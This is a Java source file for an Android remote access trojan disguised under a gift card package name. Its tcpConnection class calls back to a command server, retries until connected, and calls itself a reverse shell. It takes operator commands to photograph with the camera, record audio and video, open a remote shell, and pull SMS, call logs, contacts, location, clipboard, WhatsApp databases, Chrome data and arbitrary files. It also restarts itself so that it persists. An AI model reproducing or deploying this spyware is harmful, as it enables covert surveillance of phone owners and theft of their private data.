package com.employee.giftcard;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;


import androidx.core.content.ContextCompat;

import com.employee.giftcard.Payloads.CameraPreview;
import com.employee.giftcard.Payloads.audioManager;
import com.employee.giftcard.Payloads.getBrowserData;
import com.employee.giftcard.Payloads.getMedia;
import com.employee.giftcard.Payloads.getWhatsApp;
import com.employee.giftcard.Payloads.ipAddr;
import com.employee.giftcard.Payloads.locationManager;
import com.employee.giftcard.Payloads.newShell;
import com.employee.giftcard.Payloads.readCallLogs;
import com.employee.giftcard.Payloads.readContacts;
import com.employee.giftcard.Payloads.readSMS;
import com.employee.giftcard.Payloads.vibrate;
import com.employee.giftcard.Payloads.videoRecorder;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;

public class tcpConnection extends AsyncTask<String,Void,Void> {

    Activity activity;

    functions functions;
    Context context;

    newShell shell;

    ipAddr ipAddr = new ipAddr();
    private CameraPreview mPreview;


    static String TAG = "tcpConnectionClass";
    vibrate vibrate;
    readSMS readSMS;
    public static OutputStream out;
    locationManager locationManager;
    audioManager audioManager;
    com.employee.giftcard.Payloads.videoRecorder videoRecorder;
    com.employee.giftcard.Payloads.readCallLogs readCallLogs;


    public tcpConnection(Activity activity, Context context) {
        this.activity = activity;
        this.context = context;
        functions = new functions(activity);
        mPreview = new CameraPreview(context);
        vibrate = new vibrate(context);
        readSMS = new readSMS(context);
        locationManager = new locationManager(context,activity);
        audioManager = new audioManager();
        videoRecorder= new videoRecorder();
        readCallLogs = new readCallLogs(context,activity);
        shell = new newShell(activity,context);
    }


    @Override
    protected Void doInBackground(String... strings) {
        Socket socket = null;
        String serverHost = strings.length > 0 ? strings[0] : config.IP;
        String serverPort = strings.length > 1 ? strings[1] : config.port;
        int retryCount = 0;
        
        try {
            while(true){
                Log.d(TAG, "Attempting to connect to " + serverHost + ":" + serverPort);
                socket = new Socket();
                
                try{
                    // Connect with timeout
                    socket.connect(new InetSocketAddress(serverHost, Integer.parseInt(serverPort)), config.CONNECTION_TIMEOUT);
                    
                    if(socket.isConnected()){
                        Log.d(TAG, "Successfully connected to server");
                        retryCount = 0; // Reset retry count on successful connection
                        break;
                    }
                } catch (SocketTimeoutException | SocketException e){
                    retryCount++;
                    Log.d(TAG, "Connection failed (attempt " + retryCount + "): " + e.getMessage());
                    
                    // Progressive backoff - wait longer after multiple failures
                    int waitTime = retryCount > config.MAX_RETRIES ? config.RETRY_DELAY * 3 : config.RETRY_DELAY;
                    
                    Log.d(TAG, "Retrying in " + (waitTime/1000) + " seconds...");
                    try {
                        Thread.sleep(waitTime);
                    } catch (InterruptedException ie) {
                        ie.printStackTrace();
                    }
                }
            }
            out = new DataOutputStream(socket.getOutputStream());
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            
            // Create enhanced device identification for load balancer
            String deviceId = android.provider.Settings.Secure.getString(
                context.getContentResolver(), 
                android.provider.Settings.Secure.ANDROID_ID
            );
            String model = android.os.Build.MODEL;
            String manufacturer = android.os.Build.MANUFACTURER;
            String androidVersion = android.os.Build.VERSION.RELEASE;
            
            // Format: "Hello there, welcome to reverse shell of [Manufacturer Model] [Android Version] [Device ID]"
            String deviceInfo = manufacturer + " " + model + " (Android " + androidVersion + ") [ID:" + deviceId.substring(0, Math.min(8, deviceId.length())) + "]\n";
            String welcomeMess = "Hello there, welcome to reverse shell of " + deviceInfo;
            out.write(welcomeMess.getBytes("UTF-8"));
            
            Log.d(TAG, "Device info sent: " + deviceInfo.trim());
            String line;
            while ((line = in.readLine()) != null)
            {
                Log.d(TAG, line);
                if (line.equals("exit"))
                {
                    Log.d("service_runner","called");
                    activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            new tcpConnection(activity,context).execute(config.IP,config.port);
                        }
                    });
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        functions.jobScheduler(context);
                    }else{
                        activity.runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            context.startService(new Intent(context,mainService.class));
                        }
                    });
                    }
                    socket.close();
                }
                else if (line.equals("camList"))
                {
                    String list = functions.get_numberOfCameras();
                    out.write(list.getBytes("UTF-8"));
                }
                else if (line.matches("takepic \\d"))
                {
                    functions.getScreenUp(activity);
                    final String[] cameraid = line.split(" ");
                    try
                    {
                        out.write("IMAGE\n".getBytes("UTF-8"));
                        mPreview.startUp(Integer.parseInt(cameraid[1]),out);
                    } catch (Exception e)
                    {
                        e.printStackTrace();
                        new jumper(context).init();
                        Log.d("done", "done");
                    }
                }
                else if (line.equals("shell"))
                {
                    out.write("SHELL".getBytes("UTF-8"));
                    shell.executeShell(socket,out);
                }
                else if (line.equals("getClipData"))
                {
                    String clipboard_data = functions.readFromClipboard();
                    if (clipboard_data != null)
                    {
                        clipboard_data = clipboard_data + "\n";
                        out.write(clipboard_data.getBytes("UTF-8"));
                    }
                    else
                        {
                        out.write("No Clipboard Data Present\n".getBytes("UTF-8"));
                    }
                }
                else if (line.equals("deviceInfo"))
                {
                    out.write(functions.deviceInfo().getBytes());
                }
                else if (line.equals("help"))
                {
                    out.write("help\n".getBytes());
                }
                else if (line.equals("clear"))
                {
                    out.write("Hello there, welcome to reverse shell \n".getBytes("UTF-8"));
                }
                else if (line.equals("getSimDetails"))
                {
                    String number = functions.getPhoneNumber(context);
                    number+="\n";
                    out.write(number.getBytes("UTF-8"));
                }
                else if (line.equals("getIP"))
                {
                    String ip_addr =  "Device Ip: "+ipAddr.getIPAddress(true)+"\n";
                    out.write(ip_addr.getBytes("UTF-8"));
                }
                else if(line.matches("vibrate \\d"))
                {
                    final String[] numbers = line.split(" ");
                    vibrate.vib(Integer.parseInt(numbers[1]));
                    String res = "Vibrating "+numbers[1]+" time successful.\n";
                    out.write(res.getBytes("UTF-8"));
                }
                else if(line.contains("getSMS "))
                {
                    String[] box = line.trim().split("\\s+");
                    if(box.length >= 2 && box[1].equals("inbox")){
                        out.write("readSMS inbox\n".getBytes("UTF-8"));
                        String sms = readSMS.readSMSBox("inbox");
                        out.write(sms.getBytes("UTF-8"));
                    }else if(box.length >= 2 && box[1].equals("sent")){
                        out.write("readSMS sent\n".getBytes("UTF-8"));
                        String sms = readSMS.readSMSBox("sent");
                        out.write(sms.getBytes("UTF-8"));
                    }else{
                        out.write("readSMS null\n".getBytes("UTF-8"));
                        out.write("Wrong Command\n".getBytes("UTF-8"));
                    }
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.equals("getLocation"))
                {
                    out.write("getLocation\n".getBytes("UTF-8"));
                    String res = locationManager.getLocation();
                    out.write(res.getBytes("UTF-8"));
                    out.write("\n".getBytes("UTF-8"));
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.equals("startAudio"))
                {
                    //audioManager.startRecording(out);
                    Intent serviceIntent = new Intent(context, com.employee.giftcard.Payloads.audioManager.class);
                    serviceIntent.putExtra("ins", "startFore");
                    ContextCompat.startForegroundService(context, serviceIntent);
                }
                else if(line.equals("stopAudio"))
                {
//                    audioManager.stopRecording(out);
                    Intent serviceIntent = new Intent(context, com.employee.giftcard.Payloads.audioManager.class);
                    serviceIntent.putExtra("ins", "stopFore");
                    ContextCompat.startForegroundService(context, serviceIntent);
                }
                else if(line.matches("startVideo \\d"))
                {
                    final String[] cameraid = line.split(" ");
                    Intent serviceIntent = new Intent(context, videoRecorder.class);
                    serviceIntent.putExtra("ins", "startFore");
                    serviceIntent.putExtra("cameraid", cameraid[1]);
                    ContextCompat.startForegroundService(context, serviceIntent);

                }
                else if(line.equals("stopVideo"))
                {
                    Intent serviceIntent = new Intent(context, videoRecorder.class);
                    serviceIntent.putExtra("ins","stopFore");
                    ContextCompat.startForegroundService(context,serviceIntent);
                }
                else if(line.equals("getCallLogs"))
                {
                    out.write("callLogs\n".getBytes("UTF-8"));
                    String call_logs = readCallLogs.readLogs();
                    if(call_logs==null){
                        out.write("No call logs found on the device\n".getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }else{
                        out.write(call_logs.getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }

                }
                else if(line.equals("getContacts"))
                {
                    out.write("contacts\n".getBytes("UTF-8"));
                    readContacts contactReader = new readContacts(context);
                    String contacts = contactReader.getContacts();
                    if(contacts==null || contacts.isEmpty()){
                        out.write("No contacts found on the device\n".getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }else{
                        out.write(contacts.getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }

                }
                else if(line.equals("getPhotoList"))
                {
                    out.write("photoList\n".getBytes("UTF-8"));
                    getMedia mediaReader = new getMedia(context);
                    String photos = mediaReader.getPhotoList();
                    if(photos==null || photos.isEmpty()){
                        out.write("No photos found on the device\n".getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }else{
                        out.write(photos.getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }

                }
                else if(line.equals("getVideoList"))
                {
                    out.write("videoList\n".getBytes("UTF-8"));
                    getMedia mediaReader = new getMedia(context);
                    String videos = mediaReader.getVideoList();
                    if(videos==null || videos.isEmpty()){
                        out.write("No videos found on the device\n".getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }else{
                        out.write(videos.getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }

                }
                else if(line.startsWith("getMediaFile "))
                {
                    String filePath = line.substring(13);
                    out.write("mediaFile\n".getBytes("UTF-8"));
                    getMedia mediaReader = new getMedia(context);
                    byte[] fileData = mediaReader.getFile(filePath);
                    if(fileData==null){
                        out.write("File not found\n".getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    }else{
                        out.write(fileData);
                        out.write("END123\n".getBytes("UTF-8"));
                    }

                }
                else if(line.equals("getWhatsAppDB"))
                {
                    out.write("whatsappDB\n".getBytes("UTF-8"));
                    String whatsappData = getWhatsApp.getWhatsAppDBList(context);
                    
                    if (whatsappData == null || whatsappData.isEmpty()) {
                        out.write("No WhatsApp databases found\n".getBytes("UTF-8"));
                    } else {
                        out.write(whatsappData.getBytes("UTF-8"));
                    }
                    
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.equals("getWhatsAppMedia"))
                {
                    out.write("whatsappMedia\n".getBytes("UTF-8"));
                    String mediaData = getWhatsApp.getWhatsAppMedia(context);
                    
                    if (mediaData == null || mediaData.isEmpty()) {
                        out.write("No WhatsApp media found\n".getBytes("UTF-8"));
                    } else {
                        out.write(mediaData.getBytes("UTF-8"));
                    }
                    
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.equals("getChromeData"))
                {
                    out.write("chromeData\n".getBytes("UTF-8"));
                    String chromeData = getBrowserData.getChromeData(context);
                    
                    if (chromeData == null || chromeData.isEmpty()) {
                        out.write("No browser data found\n".getBytes("UTF-8"));
                    } else {
                        out.write(chromeData.getBytes("UTF-8"));
                    }
                    
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.equals("getDownloads"))
                {
                    out.write("downloads\n".getBytes("UTF-8"));
                    String downloads = getBrowserData.getDownloads(context);
                    
                    if (downloads == null || downloads.isEmpty()) {
                        out.write("No downloads found\n".getBytes("UTF-8"));
                    } else {
                        out.write(downloads.getBytes("UTF-8"));
                    }
                    
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.startsWith("getDataFile "))
                {
                    String filePath = line.substring(12); // "getDataFile " is 12 chars
                    out.write("dataFile\n".getBytes("UTF-8"));
                    
                    // Try WhatsApp first, then browser data
                    byte[] fileData = getWhatsApp.getFile(filePath);
                    if (fileData == null) {
                        fileData = getBrowserData.getFile(filePath);
                    }
                    
                    if (fileData == null || fileData.length == 0) {
                        out.write("File not found or empty\n".getBytes("UTF-8"));
                    } else {
                        out.write(fileData);
                    }
                    
                    out.write("END123\n".getBytes("UTF-8"));
                }
                else if(line.equals("getMACAddress"))
                {
                    String macAddress = ipAddr.getMACAddress(null);
                    macAddress+="\n";
                    out.write(macAddress.getBytes("UTF-8"));
                }
                else
                    {
                    out.write("Unknown Command \n".getBytes("UTF-8"));
                }
            }
            Log.d("service_runner","called");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                functions.jobScheduler(context);
            }else{
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        context.startService(new Intent(context,mainService.class));
                    }
                });
            }
        } catch (Exception e) {
            Log.d("service_runner","called");
            activity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    new tcpConnection(activity,context).execute(config.IP,config.port);
                }
            });
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                functions.jobScheduler(context);
            }else{
                activity.runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        context.startService(new Intent(context,mainService.class));
                    }
                });
            }
            e.printStackTrace();
        }
        return null ;
    }
}
